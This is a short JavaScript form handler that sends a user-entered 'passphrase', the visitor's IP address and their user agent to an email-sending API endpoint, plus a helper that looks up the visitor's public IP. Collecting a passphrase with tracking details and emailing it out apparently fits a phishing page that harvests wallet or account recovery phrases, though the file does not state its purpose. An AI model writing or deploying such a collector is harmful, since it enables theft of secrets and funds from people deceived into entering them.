// src/components/formHandler.js
export async function submitForm(formData) {
  try {
    // Use the correct API URL based on the environment
    const API_URL = import.meta.env.PROD 
      ? '/api/send-email'  // Production URL (Vercel will handle the routing)
      : '/api/send-email';  // Development URL (will be proxied by Vite)

    const response = await fetch(API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        passphrase: formData.passphrase,
        ip: formData.ip,
        userAgent: formData.userAgent
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Failed to send email');
    }
    
    return { success: true, data: result };
  } catch (error) {
    console.error('Error sending email:', error);
    return { success: false, error: error.message };
  }
}

// Function to get user's IP address (optional)
export async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP:', error);
    return null;
  }
}